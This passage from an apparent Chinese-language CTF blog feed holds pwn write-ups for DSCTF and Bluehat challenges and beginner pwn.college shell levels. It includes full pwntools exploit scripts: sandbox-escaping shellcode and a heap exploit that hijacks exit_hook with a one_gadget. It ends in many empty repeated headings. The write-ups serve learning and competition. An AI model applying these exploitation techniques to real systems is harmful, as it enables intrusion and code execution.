class="hljs-number">1</span>):<br>    free(i)<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">7</span>):<br>    add(i, <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x100</span>)<br>p.sendlineafter(<span class="hljs-string">b&quot;Your choice: &quot;</span>, <span class="hljs-string">b&#x27;1&#x27;</span>)<br>p.recvuntil(<span class="hljs-string">b&quot;Index: &quot;</span>)<br>p.sendline(<span class="hljs-string">&#x27;7&#x27;</span>)<br>p.recvuntil(<span class="hljs-string">b&quot;Index: 0&quot;</span>)<br>p.send(<span class="hljs-string">b&#x27;a&#x27;</span>)<br>p.recvuntil(<span class="hljs-string">b&quot;Bitmap: &quot;</span>)<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">256</span>):<br>    p.send(<span class="hljs-built_in">chr</span>(i))<br>show(<span class="hljs-number">7</span>)<br>leak = u64(<span class="hljs-built_in">bytes</span>([<span class="hljs-built_in">int</span>(p.recvline().strip().split(<span class="hljs-string">b&#x27; &#x27;</span>)[<span class="hljs-number">1</span>]) <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">8</span>)])) - <span class="hljs-number">0x3ebeb0</span><br>log.info(<span class="hljs-string">&quot;libc_base==&gt;0x%x&quot;</span> %leak)<br>sys = leak + libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]<br>edit(<span class="hljs-number">0</span>, <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x100</span>)<br><span class="hljs-comment">#debug()</span><br><span class="hljs-built_in">exec</span>(sys)<br>p.interactive()<br><br></code></pre></td></tr></table></figure>

<h1 id="rusty"><a href="#rusty" class="headerlink" title="rusty"></a>rusty</h1><p>代码看不懂，但是可以借助 fuzz 寻找漏洞点，这样就可以避免审计代码。</p>
<p><a href="https://blog.csdn.net/Invin_cible/article/details/125812355#comments_22461454">https://blog.csdn.net/Invin_cible/article/details/125812355#comments_22461454</a></p>
<h1 id="eznote"><a href="#eznote" class="headerlink" title="eznote"></a>eznote</h1><p>漏洞点在申请函数里面，别的地方都只能操作索引小于等于6的，而在申请函数中却可以多申请一个，申请到索引为7的堆块。</p>
<p><img src="/2022/07/19/2022-07-19-DSCTF/image-20220719203004107.png"><span class="image-caption">image-20220719203004107</span></p>
<p>然后再根据底下的操作，会让第7块堆块的read_size正好把第0块堆块的size更覆盖了，造成了offbyone样式的漏洞。</p>
<p><img src="/2022/07/19/2022-07-19-DSCTF/image-20220719204428735.png"><span class="image-caption">image-20220719204428735</span></p>
]]></content>
  </entry>
  <entry>
    <title>2022 bluehat</title>
    <url>/2022/07/10/2022-07-10-bluehat/</url>
    <content><![CDATA[<h1 id="初赛"><a href="#初赛" class="headerlink" title="初赛"></a>初赛</h1><h2 id="EscapeShellcode"><a href="#EscapeShellcode" class="headerlink" title="EscapeShellcode"></a>EscapeShellcode</h2><p>程序会申请一块堆地址，拥有执行权限，把每个寄存器都设为了0xdeadbeef。</p>
<p><img src="/2022/07/10/2022-07-10-bluehat/image-20220710160145324.png"><span class="image-caption">image-20220710160145324</span></p>
<p><img src="/2022/07/10/2022-07-10-bluehat/image-20220710160128054.png"><span class="image-caption">image-20220710160128054</span></p>
<p>同时开启沙箱，只允许调用write。</p>
<p><img src="/2022/07/10/2022-07-10-bluehat/image-20220710160040693.png"><span class="image-caption">image-20220710160040693</span></p>
<p>程序会读取flag放入到bss上。</p>
<p><img src="/2022/07/10/2022-07-10-bluehat/image-20220710160333732.png"><span class="image-caption">image-20220710160333732</span></p>
<p>最后就是进输入，再把我们输入内容进行调用，所以就是要去写shellcode，从而把bss上的flag读出来。</p>
<p><img src="/2022/07/10/2022-07-10-bluehat/image-20220710160252649.png"><span class="image-caption">image-20220710160252649</span></p>
<p>我的思路为：因为开启沙箱，那么就会存在许多的堆块，这些堆块上是会存在脏数据的，通过数据得到libc地址，再去读取出libc中的environ变量，得到其中的栈地址，在通过栈上存放的程序地址而得到bss地址，最后输出flag。</p>
<p>清空寄存器。</p>
<p><img src="/2022/07/10/2022-07-10-bluehat/image-20220710160709797.png"><span class="image-caption">image-20220710160709797</span></p>
<p><img src="/2022/07/10/2022-07-10-bluehat/image-20220710160728217.png"><span class="image-caption">image-20220710160728217</span></p>
<p>得到脏数据。</p>
<p><img src="/2022/07/10/2022-07-10-bluehat/image-20220710160841237.png"><span class="image-caption">image-20220710160841237</span></p>
<p>得到PIE。</p>
<p><img src="/2022/07/10/2022-07-10-bluehat/image-20220710160913734.png"><span class="image-caption">image-20220710160913734</span></p>
<p>成功打印flag。</p>
<p><img src="/2022/07/10/2022-07-10-bluehat/image-20220710161001175.png"><span class="image-caption">image-20220710161001175</span></p>
<p>该方法有缺陷，在于environ在不同的版本的偏移不同，所以需要找对libc版本，限制较大。</p>
<p>其他师傅的思路：直接打印数据，循环打印，从堆地址开始往上打印内容，直到打印出flag停止。这个就不需要版本内容，简单粗暴。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!usr/bin/env python </span><br><span class="hljs-comment">#coding=utf-8</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context(arch = <span class="hljs-string">&#x27;amd64&#x27;</span>,os = <span class="hljs-string">&#x27;linux&#x27;</span>)<br>elf = ELF(<span class="hljs-string">&#x27;./escape_shellcode&#x27;</span>)<br>DEBUG = <span class="hljs-number">0</span><br><span class="hljs-keyword">if</span> DEBUG:<br>    p = process(<span class="hljs-string">&#x27;./escape_shellcode&#x27;</span>)<br><span class="hljs-keyword">else</span>:<br>    ip = <span class="hljs-string">&#x27;39.107.108.120&#x27;</span><br>    port = <span class="hljs-number">29356</span> <br>    <span class="hljs-comment">#libc = ELF(&quot;./libc.so.6&quot;)</span><br>    p = remote(ip, port)<br>    <br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">debug</span>():</span><br>	<span class="hljs-comment">#gdb.attach(p, &quot;b main&quot;)</span><br>	gdb.attach(p, <span class="hljs-string">&quot;b *$rebase(0x1367)&quot;</span>)<br>	<br>	<br><span class="hljs-comment">#debug()</span><br>shellcode =<span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">mov rdi, 1</span><br><span class="hljs-string">mov rdx, 0x80</span><br><span class="hljs-string">mov rcx, [rip + 0x1cb8]</span><br><span class="hljs-string">shr rcx, 8</span><br><span class="hljs-string">add rcx, 0x12c0</span><br><span class="hljs-string">mov rbx, [rcx]</span><br><span class="hljs-string">sub rbx, 0x221c08</span><br><span class="hljs-string">mov rsi, [rbx]</span><br><span class="hljs-string">sub rsi, 0xb8</span><br><span class="hljs-string">mov rsi, [rsi]</span><br><span class="hljs-string">add rsi, 0x2f80</span><br><span class="hljs-string">mov rax, 1</span><br><span class="hljs-string">syscall                </span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br>shellcode = asm(shellcode)<br>p.sendline(shellcode)<br>p.interactive()<br></code></pre></td></tr></table></figure>



<h2 id="Bank"><a href="#Bank" class="headerlink" title="Bank"></a>Bank</h2><p>因为少个队友，被迫去做了电子取证，加上上一题pwn卡了挺久，这题没机会做。</p>
<p>这题就是代码稍微比上题多了点，但难度不大，不过我觉得其中运用到的利用思想还是挺重要的。</p>
<p>一开始申请了一个0x18的堆块，注意这边是直接把地址的值作为一个int64类型赋值的，我一直以为是指针。。。导致后面的打印函数理解出错，后面花了不少时间才通过gdb调试发现问题。</p>
<p><img src="/2022/07/10/2022-07-10-bluehat/image-20220721110736248.png"><span class="image-caption">image-20220721110736248</span></p>
<p>整个程序是模拟银行，刚开始程序的login以及取钱就不细说了。多提一个：就是这边的存钱也是有问题的，相等时是不会扣除money，我还以为后面会需要刷钱，结果貌似没用上。</p>
<p><img src="/2022/07/10/2022-07-10-bluehat/image-20220721111312570.png"><span class="image-caption">image-20220721111312570</span></p>
<p>在进入到转账函数中，发现还有五个菜单函数，功能如注释。</p>
<p><img src="/2022/07/10/2022-07-10-bluehat/image-20220721111429579.png"><span class="image-caption">image-20220721111429579</span></p>
<p>打印函数的话有要求只能打印堆地址+0xf8以后的内容，所以要进行合理堆块布局</p>
<p><img src="/2022/07/10/2022-07-10-bluehat/image-20220721111554666.png"><span class="image-caption">image-20220721111554666</span></p>
<p>最后一个函数功能是可以对堆的fd指针指向地址写入一个值就退出，那毫无疑问，修改fd为exit_hook，再劫持exit_hook为ogg。</p>
<p><img src="/2022/07/10/2022-07-10-bluehat/image-20220721111644535.png"><span class="image-caption">image-20220721111644535</span></p>
<p>因为最后是需要修改heap_ptr的fd指针的，所以还需要多泄露一个堆地址，这个通过2.31版本会在bk上添加key值来获得到tcache的地址。</p>
<p>而要获得libc地址则是去构造fake chunk，让其size大等于0x420，申请堆块去填补差额size，别忘了去垫堆块防止合并，最后把fake chunk释放掉，再通过malloc稳定申请0x18堆块去移动libc地址。fake chunk最好离heap_ptr近一点，这样可以少申请堆块就能泄露libc。</p>
<p><img src="/2022/07/10/2022-07-10-bluehat/image-20220721113422895.png"><span class="image-caption">image-20220721113422895</span></p>
<p>成功！</p>
<p><img src="/2022/07/10/2022-07-10-bluehat/image-20220721110556403.png"><span class="image-caption">image-20220721110556403</span></p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!usr/bin/env python </span><br><span class="hljs-comment">#coding=utf-8</span><br><span class="hljs-keyword">from</span> imp <span class="hljs-keyword">import</span> NullImporter<br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context(arch = <span class="hljs-string">&#x27;amd64&#x27;</span>,os = <span class="hljs-string">&#x27;linux&#x27;</span>,log_level = <span class="hljs-string">&#x27;debug&#x27;</span>)<br>elf = ELF(<span class="hljs-string">&#x27;./Bank&#x27;</span>)<br>DEBUG = <span class="hljs-number">1</span><br><span class="hljs-keyword">if</span> DEBUG:<br>    libc = ELF(<span class="hljs-string">&quot;/home/shoucheng/tools/glibc-all-in-one/libs/2.31-0ubuntu9.2_amd64/libc-2.31.so&quot;</span>)<br>    ld = ELF(<span class="hljs-string">&quot;/home/shoucheng/tools/glibc-all-in-one/libs/2.31-0ubuntu9.2_amd64/ld-2.31.so&quot;</span>)<br>    p = process(argv=[ld.path,elf.path], env=&#123;<span class="hljs-string">&quot;LD_PRELOAD&quot;</span> : libc.path&#125;)<br><span class="hljs-keyword">else</span>:<br>    ip = <span class="hljs-string">&#x27;127&#x27;</span><br>    port = <span class="hljs-number">30007</span><br>    <span class="hljs-comment">#libc = ELF(&quot;./libc.so.6&quot;)</span><br>    p = remote(ip, port)<br>    <br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">debug</span>(<span class="hljs-params">info=<span class="hljs-string">&#x27;b main&#x27;</span></span>):</span><br>	gdb.attach(p, info)<br>	<span class="hljs-comment">#gdb.attach(p, &quot;b *$rebase(0x)&quot;)</span><br><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">login</span>():</span><br>    p.sendlineafter(<span class="hljs-string">b&quot;Click: &quot;</span>, <span class="hljs-string">b&#x27;Login&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&quot;Card Numbers: &quot;</span>, <span class="hljs-string">b&#x27;1&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&quot;Password: &quot;</span>, <span class="hljs-string">b&#x27;1&#x27;</span>*<span class="hljs-number">6</span>)<br><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">depo</span>(<span class="hljs-params">num</span>):</span><br>    p.sendlineafter(<span class="hljs-string">b&quot;Click: &quot;</span>, <span class="hljs-string">b&quot;Deposit&quot;</span>)<br>    p.sendafter(<span class="hljs-string">b&quot;How Much?&quot;</span>, <span class="hljs-built_in">str</span>(num).encode(<span class="hljs-string">&#x27;ascii&#x27;</span>))<br><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">put</span>(<span class="hljs-params">num</span>):</span><br>    p.sendlineafter(<span class="hljs-string">b&quot;Click: &quot;</span>, <span class="hljs-string">b&quot;Put&quot;</span>)<br>    p.sendafter(<span class="hljs-string">b&quot;How Much?&quot;</span>, <span class="hljs-built_in">str</span>(num).encode(<span class="hljs-string">&#x27;ascii&#x27;</span>))<br><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">tran</span>(<span class="hljs-params">num, content, user=<span class="hljs-string">&#x27;&#x27;</span></span>):</span><br>    p.sendlineafter(<span class="hljs-string">b&quot;Click: &quot;</span>, <span class="hljs-string">b&quot;Transfer&quot;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&quot;who? &quot;</span>, user.encode(<span class="hljs-string">&#x27;ascii&#x27;</span>))<br>    <span class="hljs-keyword">if</span> user == <span class="hljs-string">&#x27;admin&#x27;</span>:<br>        p.sendafter(<span class="hljs-string">b&quot;How much? &quot;</span>, <span class="hljs-built_in">str</span>(num).encode(<span class="hljs-string">&#x27;ascii&#x27;</span>))    <br><br>    <span class="hljs-keyword">elif</span> user == <span class="hljs-string">&#x27;hacker&#x27;</span>:<br>        p.sendafter(<span class="hljs-string">b&quot;How much? &quot;</span>, <span class="hljs-built_in">str</span>(num).encode(<span class="hljs-string">&#x27;ascii&#x27;</span>))<br>        p.recvuntil(<span class="hljs-string">b&quot;hacker: Great!&quot;</span>)<br>        p.send(<span class="hljs-built_in">str</span>(content).encode(<span class="hljs-string">&#x27;ascii&#x27;</span>))<br><br>    <span class="hljs-keyword">elif</span> user == <span class="hljs-string">&#x27;guest&#x27;</span>:<br>        p.sendafter(<span class="hljs-string">b&quot;How much? &quot;</span>, <span class="hljs-built_in">str</span>(num).encode(<span class="hljs-string">&#x27;ascii&#x27;</span>))<br>        p.recvuntil(<span class="hljs-string">b&quot;data: &quot;</span>)<br>        p.send(content)<br><br>    <span class="hljs-keyword">elif</span> user == <span class="hljs-string">&#x27;ghost&#x27;</span>:<br>        p.sendafter(<span class="hljs-string">b&quot;How much? &quot;</span>, <span class="hljs-built_in">str</span>(num).encode(<span class="hljs-string">&#x27;ascii&#x27;</span>))<br>        p.recvuntil(<span class="hljs-string">b&quot;ghost: &amp;^%$#@!   :)\n&quot;</span>)<br>        p.send(<span class="hljs-built_in">str</span>(content).encode(<span class="hljs-string">&#x27;ascii&#x27;</span>))<br><br>    <span class="hljs-keyword">elif</span> user == <span class="hljs-string">&#x27;abyss&#x27;</span>:<br>        p.sendafter(<span class="hljs-string">b&quot;How much? &quot;</span>, <span class="hljs-built_in">str</span>(num).encode(<span class="hljs-string">&#x27;ascii&#x27;</span>))<br>        p.send(<span class="hljs-built_in">str</span>(content).encode(<span class="hljs-string">&#x27;ascii&#x27;</span>))<br><br><br>login()<br>put(<span class="hljs-number">0x190</span>)<br>tran(<span class="hljs-number">0xb</span>, <span class="hljs-number">0x38</span>, <span class="hljs-string">&#x27;ghost&#x27;</span>)<br>tran(<span class="hljs-number">6</span>, p64(<span class="hljs-number">0</span>)+p64(<span class="hljs-number">0x421</span>), <span class="hljs-string">&#x27;guest&#x27;</span>)<br>tran(<span class="hljs-number">0xb</span>, <span class="hljs-number">0x48</span>, <span class="hljs-string">&#x27;ghost&#x27;</span>)<br>tran(<span class="hljs-number">6</span>, <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x10</span>, <span class="hljs-string">&#x27;guest&#x27;</span>)<br>tran(<span class="hljs-number">0xb</span>, <span class="hljs-number">0x58</span>, <span class="hljs-string">&#x27;ghost&#x27;</span>)<br>tran(<span class="hljs-number">6</span>, <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x10</span>, <span class="hljs-string">&#x27;guest&#x27;</span>)<br>tran(<span class="hljs-number">0xb</span>, <span class="hljs-number">0x68</span>, <span class="hljs-string">&#x27;ghost&#x27;</span>)<br>tran(<span class="hljs-number">0x1f</span>, <span class="hljs-string">&#x27;a&#x27;</span>, <span class="hljs-string">&#x27;admin&#x27;</span>)<br>p.recvuntil(<span class="hljs-string">b&quot;I think 0x&quot;</span>)<br>heap = <span class="hljs-built_in">int</span>(p.recv(<span class="hljs-number">12</span>), <span class="hljs-number">16</span>) - <span class="hljs-number">0x10</span><br>log.info(<span class="hljs-string">&quot;heap_base==&gt;0x%x&quot;</span> %heap)<br>tran(<span class="hljs-number">0xb</span>, <span class="hljs-number">0x78</span>, <span class="hljs-string">&#x27;ghost&#x27;</span>)<br>tran(<span class="hljs-number">6</span>, <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x10</span>, <span class="hljs-string">&#x27;guest&#x27;</span>)<br>tran(<span class="hljs-number">0xb</span>, <span class="hljs-number">0x88</span>, <span class="hljs-string">&#x27;ghost&#x27;</span>)<br>tran(<span class="hljs-number">6</span>, <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x10</span>, <span class="hljs-string">&#x27;guest&#x27;</span>)<br>tran(<span class="hljs-number">0xb</span>, <span class="hljs-number">0x98</span>, <span class="hljs-string">&#x27;ghost&#x27;</span>)<br>tran(<span class="hljs-number">6</span>, <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x10</span>, <span class="hljs-string">&#x27;guest&#x27;</span>)<br>tran(<span class="hljs-number">0xb</span>, <span class="hljs-number">0x100</span>, <span class="hljs-string">&#x27;ghost&#x27;</span>)<br>tran(<span class="hljs-number">6</span>, <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x10</span>, <span class="hljs-string">&#x27;guest&#x27;</span>)<br>tran(<span class="hljs-number">0x33</span>, heap+<span class="hljs-number">0x310</span>, <span class="hljs-string">&#x27;hacker&#x27;</span>)<br>tran(<span class="hljs-number">6</span>, <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x10</span>, <span class="hljs-string">&#x27;guest&#x27;</span>)<br>tran(<span class="hljs-number">6</span>, <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x10</span>, <span class="hljs-string">&#x27;guest&#x27;</span>)<br>tran(<span class="hljs-number">6</span>, <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x10</span>, <span class="hljs-string">&#x27;guest&#x27;</span>)<br>tran(<span class="hljs-number">6</span>, <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x10</span>, <span class="hljs-string">&#x27;guest&#x27;</span>)<br>tran(<span class="hljs-number">0x1f</span>, <span class="hljs-string">&#x27;a&#x27;</span>, <span class="hljs-string">&#x27;admin&#x27;</span>)<br>p.recvuntil(<span class="hljs-string">b&quot;I think 0x&quot;</span>)<br>leak = <span class="hljs-built_in">int</span>(p.recv(<span class="hljs-number">12</span>), <span class="hljs-number">16</span>) - <span class="hljs-number">0x1ebbe0</span><br>log.info(<span class="hljs-string">&quot;libc_base==&gt;0x%x&quot;</span> %leak)<br>exit_hook = leak + <span class="hljs-number">0x426f68</span><br>ogg = leak + <span class="hljs-number">0xe6c7e</span><br>tran(<span class="hljs-number">0x33</span>, heap+<span class="hljs-number">0x2a0</span>, <span class="hljs-string">&#x27;hacker&#x27;</span>)<br>tran(<span class="hljs-number">6</span>, p64(exit_hook), <span class="hljs-string">&#x27;guest&#x27;</span>)<br><span class="hljs-comment">#debug()</span><br>tran(<span class="hljs-number">1</span>, ogg, <span class="hljs-string">&#x27;abyss&#x27;</span>)<br><br>p.interactive()<br><br><br></code></pre></td></tr></table></figure>

]]></content>
  </entry>
  <entry>
    <title>pwn.college</title>
    <url>/2022/07/07/2022-07-07-pwn-college-1/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>跟着pwn.college把之前因为CTF而略过的基础知识一点点的补回来，同时打好基础，更上一步吧。</p>
<h1 id="level1"><a href="#level1" class="headerlink" title="level1"></a>level1</h1><p>第一题到challenge下执行一下程序即可获得flag。</p>
<p><img src="/2022/07/07/2022-07-07-pwn-college-1/image-20220707213622251.png"><span class="image-caption">image-20220707213622251</span></p>
<h1 id="level2"><a href="#level2" class="headerlink" title="level2"></a>level2</h1><p>第二个相比于第一个需要一个密码才行，而密码在执行文件里面，所以需要把ELF文件下下来，这边采用的是MobaXterm，直接拖拽就行了。</p>
<p><img src="/2022/07/07/2022-07-07-pwn-college-1/image-20220707221800286.png"><span class="image-caption">image-20220707221800286</span></p>
<p>密码就在文件里面藏着，输入即可。</p>
<p><img src="/2022/07/07/2022-07-07-pwn-college-1/image-20220707222150003.png"><span class="image-caption">image-20220707222150003</span></p>
<h1 id="level3"><a href="#level3" class="headerlink" title="level3"></a>level3</h1><p>第三题根据报错提示，需要增加一个参数，所以在执行文件时在后面加入缺少的参数即可。</p>
<h1 id="level4"><a href="#level4" class="headerlink" title="level4"></a>level4</h1><p>第四题根据报错信息，lmfmk环境变量的值要为wgwocxkpq，所以按要求添加即可。</p>
<p>使用下方命令可添加环境变量，也可以修改环境变量的值。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">export lmfmk=wgwocxkpq<br></code></pre></td></tr></table></figure>

<p>另：<code>env</code> 命令可以查看环境变量。</p>
<p><img src="/2022/07/07/2022-07-07-pwn-college-1/image-20220712205412432.png"><span class="image-caption">image-20220712205412432</span></p>
<p>还可以使用命令：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">env lmfmks=wgwocwxkpq ./embryoio_level4<br></code></pre></td></tr></table></figure>

<p>这样不会像<code>export</code>直接改变所有的环境变量，而是在执行程序时把提供的值作为其的一个环境变量进行执行，只是一个暂时的环境变量。</p>
<p><img src="/2022/07/07/2022-07-07-pwn-college-1/image-20220712222710729.png"><span class="image-caption">image-20220712222710729</span></p>
<h1 id="level5"><a href="#level5" class="headerlink" title="level5"></a>level5</h1><p>第五题考查重定向的输入问题，根据提示，需要在/tmp下创建一个文件重定向作为输入传递给执行文件。</p>
<figure class="highlight arcade"><table><tr><td class="code"><pre><code class="hljs arcade">./embryoio_level5&lt;<span class="hljs-regexp">/tmp/</span>ppbnrh<br></code></pre></td></tr></table></figure>

<p><img src="/2022/07/07/2022-07-07-pwn-college-1/image-20220712210721144.png"><span class="image-caption">image-20220712210721144</span></p>
<p>输入后，还要求了一个密码，把文件内容改为密码即可。</p>
<p><img src="/2022/07/07/2022-07-07-pwn-college-1/image-20220712215856399.png"><span class="image-caption">image-20220712215856399</span></p>
<p>注：重定向符号左边的是执行程序或者命令，右边是文件。也就是说按照下面这么写是无法进行重定向的。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">./embryoio_level5&lt;/tmp/ppbnrh<br></code></pre></td></tr></table></figure>

<p><img src="/2022/07/07/2022-07-07-pwn-college-1/image-20220712220534198.png"><span class="image-caption">image-20220712220534198</span></p>
<h1 id="level6"><a href="#level6" class="headerlink" title="level6"></a>level6</h1><p>第六题考察的也是重定向，这回考察的是输出的重定向。</p>
<p><img src="/2022/07/07/2022-07-07-pwn-college-1/image-20220712222042053.png"><span class="image-caption">image-20220712222042053</span></p>
<p>将程序的输出重定向到给出的/tmp下的文件，然后输出文件内容，便是flag。</p>
<h1 id="level7"><a href="#level7" class="headerlink" title="level7"></a>level7</h1><p>第七题要求执行程序时，程序的环境变量为空。</p>
<p><img src="/2022/07/07/2022-07-07-pwn-college-1/image-20220712222310394.png"><span class="image-caption">image-20220712222310394</span></p>
<p>使用命令：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">env -i ./embryoio_level7<br></code></pre></td></tr></table></figure>

<p>即可设置执行程序的环境变量为空。</p>
<h1 id="level8"><a href="#level8" class="headerlink" title="level8"></a>level8</h1><p>第八题要求写一个sh文件执行程序，当前目录下没有权限，我是在/tmp下创建，然后执行sh文件即可。</p>
<p><img src="/2022/07/07/2022-07-07-pwn-college-1/image-20220713095039615.png"><span class="image-caption">image-20220713095039615</span></p>
<p>脚本书写如下图：</p>
<p><img src="/2022/07/07/2022-07-07-pwn-college-1/image-20220713095242233.png"><span class="image-caption">image-20220713095242233</span></p>
<h1 id="level9"><a href="#level9" class="headerlink" title="level9"></a>level9</h1><p>第九题一开始的要求也是编写sh脚本运行程序。</p>
<p><img src="/2022/07/07/2022-07-07-pwn-college-1/image-20220713095853191.png"><span class="image-caption">image-20220713095853191</span></p>
<p>执行完后，提示说还需要输入密码。</p>
<p><img src="/2022/07/07/2022-07-07-pwn-college-1/image-20220713095931718.png"><span class="image-caption">image-20220713095931718</span></p>
<p>因为都是脚本写的，我就又创建一个文件存放密码，重定向输入到执行程序中。</p>
<p><img src="/2022/07/07/2022-07-07-pwn-college-1/image-20220713100159563.png"><span class="image-caption">image-20220713100159563</span></p>
<h1 id="level10"><a href="#level10" class="headerlink" title="level10"></a>level10</h1><p>第十题，一样还是编写sh脚本执行程序。</p>
<p><img src="/2022/07/07/2022-07-07-pwn-college-1/image-20220713100530447.png"><span class="image-caption">image-20220713100530447</span></p>
<p>这次要求为传入参数为指定值。</p>
<p><img src="/2022/07/07/2022-07-07-pwn-college-1/image-20220713100611339.png"><span class="image-caption">image-20220713100611339</span></p>
<p>像之前在shell输入的形式一样即可。</p>
<p><img src="/2022/07/07/2022-07-07-pwn-college-1/image-20220713100644372.png"><span class="image-caption">image-20220713100644372</span></p>
<h1 id="level11"><a href="#level11" class="headerlink" title="level11"></a>level11</h1><p>第十一题，还是与之前形式差不多，这次要求是需要一个环境变量。</p>
<p><img src="/2022/07/07/2022-07-07-pwn-college-1/image-20220713102040206.png"><span class="image-caption">image-20220713102040206</span></p>
<p>就是把前几题的命令写入sh脚本即可：</p>
<p><img src="/2022/07/07/2022-07-07-pwn-college-1/image-20220713102628018.png"><span class="image-caption">image-20220713102628018</span></p>
<h1 id="level12"><a href="#level12" class="headerlink" title="level12"></a>level12</h1><p>十二题</p>
<h1 id="level13"><a href="#level13" class="headerlink" title="level13"></a>level13</h1><h1 id="level14"><a href="#level14" class="headerlink" title="level14"></a>level14</h1><h1 id="level5-1"><a href="#level5-1" class="headerlink" title="level5"></a>level5</h1><h1 id="level5-2"><a href="#level5-2" class="headerlink" title="level5"></a>level5</h1><h1 id="level5-3"><a href="#level5-3" class="headerlink" title="level5"></a>level5</h1><h1 id="level5-4"><a href="#level5-4" class="headerlink" title="level5"></a>level5</h1><h1 id="level5-5"><a href="#level5-5" class="headerlink" title="level5"></a>level5</h1><h1 id="level5-6"><a href="#level5-6" class="headerlink" title="level5"></a>level5</h1><h1 id="level5-7"><a href="#level5-7" class="headerlink" title="level5"></a>level5</h1><h1 id="level5-8"><a href="#level5-8" class="headerlink" title="level5"></a>level5</h1><h1 id="level5-9"><a href="#level5-9" class="headerlink" title="level5"></a>level5</h1><h1 id="level5-10"><a href="#level5-10" class="headerlink" title="level5"></a>level5</h1><h1 id="level5-11"><a href="#level5-11" class="headerlink" title="level5"></a>level5</h1><h1 id="level5-12"><a href="#level5-12" class="headerlink" title="level5"></a>level5</h1><h1 id="level5-13"><a href="#level5-13" class="headerlink" title="level5"></a>level5</h1><h1 id="level5-14"><a href="#level5-14" class="headerlink" title="level5"></a>level5</h1><h1 id="level5-15"><a href="#level5-15" class="headerlink" title="level5"></a>level5</h1><h1 id="level5-16"><a href="#level5-16" class="headerlink" title="level5"></a>level5</h1><h1 id="level5-17"><a href="#level5-17" class="headerlink" title="level5"></a>level5</h1><h1 id="level5-18"><a href="#level5-18" class="headerlink" title="level5"></a>level5</h1><h1 id="level5-19"><a href="#level5-19" class="headerlink" title="level5"></a>level5</h1><h1 id="level5-20"><a href="#level5-20" class="headerlink" title="level5"></a>level5</h1><h1 id="level5-21"><a href="#level5-21" class="headerlink" title="level5"></a>level5</h1><h1 id="level5-22"><a href="#level5-22" class="headerlink" title="level5"></a>level5</h1><h1 id="level5-23"><a href="#level5-23" class="headerlink" title="level5"></a>level5</h1><h1 id="level5-24"><a href="#level5-24" class="headerlink" title="level5"></a>level5</h1><h1 id="level5-25"><a href="#level5-25" class="headerlink" title="level5"></a>level5</h1><h1 id="level5-26"><a href="#level5-26" class="headerlink" title="level5"></a>level5</h1><h1 id="level5-27"><a href="#level5-27" class="headerlink" title="level5"></a>level5</h1><h1 id="level5-28"><a href="#level5-28" class="headerlink" title="level5"></a>level5</h1><h1 id="level5-29"><a href="#level5-29" class="headerlink" title="level5"></a>level5</h1><h1 id="level5-30"><a href="#level5-30" class="headerlink" title="level5"></a>level5</h1><h1 id="level5-31"><a href="#level5-31" class="headerlink" title="level5"></a>level5</h1><h1 id="level5-32"><a href="#level5-32" class="headerlink" title="level5"></a>level5</h1><p>v</p>
<h1 id="level5-33"><a href="#level5-33" class="headerlink" title="level5"></a>level5</h1><h1 id="level5-34"><a href="#level5-34" class="headerlink" title="level5"></a>level5</h1><h1 id="level5-35"><a href="#level5-35" class="headerlink" title="level5"></a>level5</h1><h1 id="level5-36"><a href="#level5-36" class="headerlink" title="level5"></a>level5</h1><h1 id="level5-37"><a href="#level5-37" class="headerlink" title="level5"></a>level5</h1><h1 id="level5-38"><a href="#level5-38" class="headerlink" title="level5"></a>level5</h1><h1 id="level5-39"><a href="#level5-39" class="headerlink" title="level5"></a>level5</h1><h1 id="level5-40"><a href="#level5-40" class="headerlink" title="level5"></a>level5</h1><h1 id="level5-41"><a href="#level5-41" class="headerlink" title="level5"></a>level5</h1><h1 id="level5-42"><a href="#level5-42" class="headerlink" title="level5"></a>level5</h1><h1 id="level5-43"><a href="#level5-43" class="headerlink" title="level5"></a>level5</h1><h1 id="level5-44"><a href="#level5-44" class="headerlink" title="level5"></a>level5</h1><h1 id="level5-45"><a 